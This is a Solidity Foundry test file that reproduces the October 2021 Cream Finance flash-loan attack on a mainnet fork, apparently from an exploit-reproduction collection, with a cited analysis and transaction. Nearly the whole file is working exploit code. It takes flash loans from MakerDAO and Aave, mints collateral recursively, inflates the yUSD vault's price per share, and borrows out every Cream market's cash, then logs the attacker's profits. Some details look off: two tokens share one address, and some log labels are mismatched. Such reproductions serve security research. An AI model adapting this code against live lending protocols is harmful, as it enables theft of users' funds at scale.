// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://medium.com/immunefi/hack-analysis-cream-finance-oct-2021-fc222d913fc5
// @TX
// https://etherscan.io/tx/0x0fe2542079644e107cbf13690eb9c2c65963ccb79089ff96bfaf8dced2331c92
// @Credit
// https://github.com/Hephyrius/Immuni-4-CREAM/tree/main/contracts/CREAM

// @Summary
// FirstContarct: MakerDao FlashLoan 500M DAI -> Convert to yUSD -> yUSD mint crYUSD in CreamFinance,crYUSD as collateral, velue: $500M -> secondContract: ->Aave FlashLoan 524_000 ETH -> send 6000 ETH to FirstContarct, other mint crETH in CreamFinance, crETH as collateral, value: $2B ->twice borrow about $500M yUSD to mint crYUSD, send to FirstContarct,now the FirstContarct collateral value: $1.5B -> borrow 500M yUSD send to FirstContarct -> FirstContarct: withdraw yUSD to 4-Curve token double the price crYUSD collateral ->now the FirstContarct collateral value: $3B, borrow fund -> $2B repay Aave FlashLoan, $500M repay MakerDao FlashLoan -> theoretically, there a 500M profit margin

interface YDAI is IERC20 {}

interface YVaultPeakProxy {
    function redeemInYusd(uint256 dusdAmout, uint256 minOut) external;
}

interface IYearnVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function pricePerShare() external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

interface ICurveDepositor {
    function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[4] memory amounts, uint256 max_burn_amount) external;
    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 min_uamount,
        bool donate_dust
    ) external;
}

interface ICether {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function mint() external payable;
    function underlying() external view returns (address);
}

interface ICrToken {
    function borrow(uint256 borrowAmount) external;
    function mint(uint256 mintAmount) external;
    function underlying() external view returns (address);
    function getCash() external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external;
    // function getAccountLiquidity() external view returns(address[] memory markets);
}

contract SecondContract {
    address contractAddress;
    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
    IAaveFlashloan AaveFlash = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address constant aWETH = 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;

    function justDoIt(address paramAddress) public {
        contractAddress = paramAddress;
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 524_102 * 1e18;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        console.log("[7. Aave FlashLoan 524_102 WETH]");
        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        // console.log("The WETH amount: ", WETH.balanceOf(address(this))  / 1e18);
        console.log("[8. Transfer 6000 WETH to first contract]");
        WETH.transfer(contractAddress, 6000 * 1e18);

        console.log("[9. Convert WETH->ETH->crETH, the second contract collateral in Cream.Finance]");
        address(WETH).call(abi.encodeWithSignature("withdraw(uint256)", 518_102 * 1e18));
        ICether(crETH).mint{value: 518_102 ether}();

        console.log("[10. Cream.Finance crETH enterMarket]");
        address[] memory markets = new address[](1);
        markets[0] = crETH;
        comptroller.enterMarkets(markets);

        console.log("------------Recursion------------");
        console.log(
            "[11. repeatedly borrow yUSD to mint crUSD, send to first contract, add the first contract conllateral"
        );
        IERC20(yUSD).approve(crYUSD, type(uint256).max);
        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));
        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));
        console.log("The crYUSD amount in first contract: ", IERC20(crYUSD).balanceOf(contractAddress) / 1e8);

        console.log("[12. borrow yUSD and send to first contract]");
        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        IERC20(yUSD).transfer(contractAddress, IERC20(yUSD).balanceOf(address(this)));

        console.log("------------Jump first contract------------");
        contractAddress.call(abi.encodeWithSignature("doIt()"));

        console.log("[15. Repay Aave FlashLoan]");
        WETH.approve(address(AaveFlash), type(uint256).max);
        return true;
    }

    receive() external payable {}
}

contract ContractTest is Test {
    IDaiFlashloan DaiFlash = IDaiFlashloan(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
    ICurvePool curvePool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
    ICurveDepositor curveDepositors = ICurveDepositor(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    YDAI yDAI = YDAI(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DUSD = IERC20(0x5BC25f649fc4e26069dDF4cF4010F9f706c23831);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 yDAI_yUSDC_yUSDT_yTUSD = IERC20(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);
    address constant curveDepositor = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
    address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address constant DUSDPOOL = 0x8038C01A0390a8c547446a0b2c18fc9aEFEcc10c;
    address constant PeakProxy = 0xA89BD606d5DadDa60242E8DEDeebC95c41aD8986;
    address constant crDAI = 0x92B767185fB3B04F881e3aC8e5B0662a027A1D9f;
    address constant crUSDT = 0x797AAB1ce7c01eB727ab980762bA88e7133d2157;
    address constant crUSDC = 0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322;
    address constant crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address constant crCRETH2 = 0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2;
    address constant crFEI = 0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91;
    address constant crFTT = 0x10FDBD1e48eE2fD9336a482D746138AE19e649Db;
    address constant crPERP = 0x299e254A8a165bBeB76D9D69305013329Eea3a3B;
    address constant crRUNE = 0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41;
    address constant crDPI = 0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D;
    address constant crUNI = 0xe89a6D0509faF730BD707bf868d9A2A744a363C7;
    address constant crGNO = 0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E;
    address constant crSTETH = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address constant crXSUSHI = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address constant crYGG = 0x4112a717edD051F77d834A6703a1eF5e3d73387F;
    address secondContract;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 13_499_797);
    }

    function testExploit() public {
        SecondContract exploitContract = new SecondContract();
        secondContract = address(exploitContract);
        console.log("[1. Beigin]");
        console.log("------------Acquire Capital------------");
        console.log("[2. MakerDao FlashLoan 500_000_000 DAI]");
        DaiFlash.flashLoan(address(this), address(DAI), 500_000_000 * 1e18, "");

        console.log("[17. End]");
        console.log("------------Proift------------");
        console.log("Attacker WETH balance after exploit: ", WETH.balanceOf(address(this)) / 1e18);
        console.log("Attacker crDAI balance after exploit: ", withdrawUnderlying(crDAI) / 1e18);
        console.log("Attacker crUSDT balance after exploit: ", withdrawUnderlying(crUSDT) / 1e6);
        console.log("Attacker crUSDC balance after exploit: ", withdrawUnderlying(crUSDC) / 1e6);
        console.log("Attacker crETH balance after exploit: ", withdrawUnderlying(crCRETH2) / 1e18);
        console.log("Attacker crCRETH2 balance after exploit: ", withdrawUnderlying(crDAI) / 1e18);
        console.log("Attacker crFEI balance after exploit: ", withdrawUnderlying(crFEI) / 1e18);
        console.log("Attacker crFTT balance after exploit: ", withdrawUnderlying(crFTT) / 1e18);
        console.log("Attacker crPERP balance after exploit: ", withdrawUnderlying(crPERP) / 1e18);
        console.log("Attacker crRUNE balance after exploit: ", withdrawUnderlying(crRUNE) / 1e18);
        console.log("Attacker crDPI balance after exploit: ", withdrawUnderlying(crDPI) / 1e18);
        console.log("Attacker crUNI balance after exploit: ", withdrawUnderlying(crUNI) / 1e18);
        console.log("Attacker crGNO balance after exploit: ", withdrawUnderlying(crGNO) / 1e18);
        console.log("Attacker crXSUSHI balance after exploit: ", withdrawUnderlying(crXSUSHI) / 1e18);
        console.log("Attacker crSTETH balance after exploit: ", withdrawUnderlying(crSTETH) / 1e18);
        console.log("Attacker crYGG balance after exploit: ", withdrawUnderlying(crYGG) / 1e18);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // console.log("The DAI amount in contract: ", DAI.balanceOf(address(this))  / 1e18);

        console.log("[3. deposit DAI to YearnVault get yDAI]");
        DAI.approve(curveDepositor, type(uint256).max);
        // Impersonate the attacker's function call revert the unknown error, instead of another trace
        // yDAI.deposit(DAI.balanceOf(address(this)));
        // console.log("The yDAI amount in contract: ", yDAI.balanceOf(address(this))  / 1e18);

        // console.log("[3. deposit yDAI to Yearn 4-Curve Pool get yUSD]");
        // yDAI.approve(address(curveDepositor), type(uint).max);
        uint256[4] memory amounts = [DAI.balanceOf(address(this)), 0, 0, 0];
        ICurveDepositor(curveDepositor).add_liquidity(amounts, 1);
        // console.log("The yDAI_yUSDC_yUSDT_yTUSD Token amount: ", yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this))  / 1e18);

        console.log("[4. deposit yDAI_yUSDC_yUSDT_yTUSD to get yUSD]");
        yDAI_yUSDC_yUSDT_yTUSD.approve(yUSD, type(uint256).max);
        IYearnVault(yUSD).deposit(yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));
        // console.log("The yUSD amount: ", IERC20(yUSD).balanceOf(address(this)) / 1e18);

        console.log("[5. use yUSD to mint crYUSD, the first contract collateral in Cream.Finance]");
        IERC20(yUSD).approve(crYUSD, type(uint256).max);
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
        console.log("The crYUSD amount in first contract: ", IERC20(crYUSD).balanceOf(address(this)) / 1e8);

        console.log("[6. Cream.Finance crYUSD enterMarket]");
        address[] memory markets = new address[](1);
        markets[0] = crYUSD;
        comptroller.enterMarkets(markets);
        console.log("------------Jump second Contract------------");
        secondContract.call(abi.encodeWithSignature("justDoIt(address)", address(this)));

        console.log("[16. Repay DAI FlashLoan]");
        amounts[0] = 445_331_495_265_152_128_661_273_376;
        curveDepositors.remove_liquidity_imbalance(amounts, yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));
        yDAI.withdraw(yDAI.balanceOf(address(this)));
        USDCToDAI();
        // console.log("The DAI amount: ", DAI.balanceOf(address(this)) /1e18);
        DAI.approve(address(DaiFlash), type(uint256).max);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function doIt() external {
        console.log("[12. WETH->USDC->DUSD->YUSD]");
        WETHToUSDC();
        USDC.approve(DUSDPOOL, type(uint256).max);
        IcurveYSwap(DUSDPOOL).exchange_underlying(2, 0, 3_726_501_383_126, 0);
        DUSD.approve(PeakProxy, type(uint256).max);
        YVaultPeakProxy(PeakProxy).redeemInYusd(DUSD.balanceOf(address(this)), 0);
        console.log("The yUSD amount in first contract: ", IERC20(yUSD).balanceOf(address(this)) / 1e18);

        console.log("------------Inflation------------");
        console.log("[13. Pump the pricePerShare]");
        console.log("pricepershare start : ", IYearnVault(yUSD).pricePerShare() / 1e18);
        IYearnVault(yUSD).withdraw(IERC20(yUSD).balanceOf(address(this)));
        // withdraw yUSD to yDAI_yUSDC_yUSDT_yTUSD
        yDAI_yUSDC_yUSDT_yTUSD.transfer(yUSD, IYearnVault(yUSD).totalAssets());
        console.log("pricepershare end : ", IYearnVault(yUSD).pricePerShare() / 1e18);

        console.log("------------HeistAndRepay------------");
        console.log("[14. borrow token from Cream.Finance]");
        borrowAll();
        address(WETH).call{value: 523_208 ether}("");
        WETH.transfer(secondContract, 524_574 * 1e18);
    }

    function WETHToUSDC() internal {
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _Params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 7_500_000 * 1e6,
            amountInMaximum: 5000 * 1e18,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Params);
    }

    function USDCToDAI() internal {
        USDC.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _Params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(DAI),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 6_356_555 * 1e18,
            amountInMaximum: 6_451_883 * 1e18,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Params);
    }

    function borrowAll() internal {
        borrowAllETH();
        borrowTokens(crDAI);
        borrowTokens(crUSDC);
        borrowTokens(crUSDT);
        borrowTokens(crFEI);
        borrowTokens(crCRETH2);
        borrowTokens(crFTT);
        borrowTokens(crPERP);
        borrowTokens(crRUNE);
        borrowTokens(crDPI);
        borrowTokens(crUNI);
        borrowTokens(crGNO);
        borrowTokens(crXSUSHI);
        borrowTokens(crSTETH);
        borrowTokens(crYGG);
    }

    function borrowAllETH() internal {
        ICether(crETH).borrow(523_208 * 1e18);
    }

    function borrowTokens(address token) internal {
        ICrToken(token).borrow(ICrToken(token).getCash());
    }

    function withdrawUnderlying(address token) public returns (uint256 amount) {
        address underlying = ICrToken(token).underlying();
        amount = IERC20(underlying).balanceOf(address(this));
    }

    receive() external payable {}
}
